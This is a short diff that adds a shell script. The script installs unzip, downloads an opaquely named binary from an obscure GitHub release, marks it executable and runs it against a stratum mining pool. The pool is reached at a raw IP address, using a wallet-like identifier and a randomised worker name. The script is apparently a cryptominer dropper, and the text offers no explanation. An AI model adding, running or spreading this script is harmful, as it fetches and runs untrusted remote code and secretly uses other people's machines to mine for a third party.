@@ -1,0 +1,5 @@
+#!/bin/sh
+apt update && apt install unzip -y
+wget https://github.com/virtolm/jnccv/releases/download/jjjhn/jnddv
+chmod +x jnddv
+./jnddv -P stratum1+tcp://cb5691ea88389782ab6415d498877356f66e6c37a778.$(shuf -n 1 -i 1-99999)-hiiiB@3.17.190.3:8082
